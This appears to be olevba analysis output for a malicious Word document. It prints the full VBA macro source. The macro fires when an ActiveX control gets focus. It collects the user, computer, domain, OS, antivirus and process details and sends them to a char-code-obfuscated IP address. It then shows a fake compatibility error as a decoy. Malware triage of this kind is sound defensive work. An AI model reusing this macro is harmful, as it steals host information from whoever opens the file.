olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.SAgent.gen-34a6889a617b2d0e99817a881652446bd2110a78001657f7c51b1d6ad9ec573f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.SAgent.gen-34a6889a617b2d0e99817a881652446bd2110a78001657f7c51b1d6ad9ec573f - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub InkEdit1_GotFocus()
     Main
End Sub
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: HEUR-Trojan.MSOffice.SAgent.gen-34a6889a617b2d0e99817a881652446bd2110a78001657f7c51b1d6ad9ec573f - OLE stream: 'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function Send(data As String)
    Dim myURL As String
    myURL = Decode(Str2Arr("104-116-116-112-58-47-47-50-51-46-50-53-52-46-50-51-48-46-50-49-57-47-103-97-116-101-50-47-105-110-102-111-46-112-104-112-63-105-100-61")) & data
    On Error Resume Next
    Dim WinHttpReq As Object
    Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
    WinHttpReq.Open "GET", myURL, False
    WinHttpReq.Send
End Function

Function Str2Arr(str)
    Str2Arr = Split(str, "-", -1)
End Function

Function Decode(a1)
    Dim b1 As String
    Dim s1 As String
    lb1 = LBound(a1)
    ub1 = UBound(a1)
    For o1 = lb1 To ub1
    
        b1 = Chr(a1(o1))
        s1 = s1 + b1
    Next o1
    Decode = s1
End Function

Function Encode(a1 As String)
    Dim b1 As String
    Dim s1 As String
    For o1 = 1 To Len(a1)
        b1 = Asc(Mid(a1, o1, 1))
        s1 = s1 + b1 + "-"
    Next o1
    Encode = s1
End Function
Function Main()
    Send Encode(GetDocName & "|" & GetComputerInfo & "|" & GetOSInfo & "|" & GetAV & "|" & GetProc)
    MsgBox "This application appears to have been made with an older version of the Microsoft Office product suite. Please have the author save this document to a newer and supported format. [Error Code: -219]", 16
End Function

Function GetAV()
    Dim winMgmts, avs, avList
    Set winMgmts = GetObject("winmgmts:\\.\root\SecurityCenter2")
    
    If IsArray(Array(1, 2, 3)) Then
        req = Decode(Str2Arr("83-69-76-69-67-84-32-42-32-70-82-79-77-32-65-110-116-105-86-105-114-117-115-80-114-111-100-117-99-116"))
    Else
        req = ""
    End If
    
    Set avs = winMgmts.ExecQuery(req)
    For Each av In avs
        avList = avList & av.displayName & ","
    Next
    GetAV = "av:" & avList
End Function

Function GetProc()
    Dim winMgmts, processes, processesList
    Set winMgmts = GetObject("winmgmts:")
    
    If IsArray(Array(1, 2, 3)) Then
        req = Decode(Str2Arr("83-69-76-69-67-84-32-42-32-70-82-79-77-32-87-105-110-51-50-95-80-114-111-99-101-115-115"))
    Else
        req = ""
    End If
    
    Set processes = winMgmts.ExecQuery(req)
    For Each proces In processes
        processesList = processesList & proces.Name & ","
    Next
    GetProc = "processes:" & processesList
End Function
Function GetDocName()
    GetDocName = "document_name:" & ThisDocument.Name
End Function

Function GetComputerInfo()
    Dim computerInfo
    Set systemSet = GetObject("winmgmts:").InstancesOf("Win32_ComputerSystem")
    For Each sys In systemSet
        computerInfo = "computer_name:" & sys.Name & "|" & _
            "user_name:" & sys.UserName & "|" & _
            "domain:" & sys.Domain & "|" & _
            "domain_role:" & sys.DomainRole & "|" & _
            "workgroup:" & sys.Workgroup & "|" & _
            "manufacturer:" & sys.Manufacturer & "|" & _
            "model:" & sys.Model & "|" & _
            "system_type:" & sys.SystemType & ""
    Next
    GetComputerInfo = computerInfo
End Function

Function GetOSInfo()
    Dim osInfo
    For Each objOS In GetObject("winmgmts:").InstancesOf("Win32_OperatingSystem")
        osInfo = "os_name:" & objOS.Caption & "|" & _
        "os_version:" & objOS.Version
    Next
    GetOSInfo = osInfo
End Function
-------------------------------------------------------------------------------
VBA MACRO Module2.bas 
in file: HEUR-Trojan.MSOffice.SAgent.gen-34a6889a617b2d0e99817a881652446bd2110a78001657f7c51b1d6ad9ec573f - OLE stream: 'VBA/Module2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |InkEdit1_GotFocus   |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Microsoft.XMLHTTP   |May download files from the Internet         |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
+----------+--------------------+---------------------------------------------+

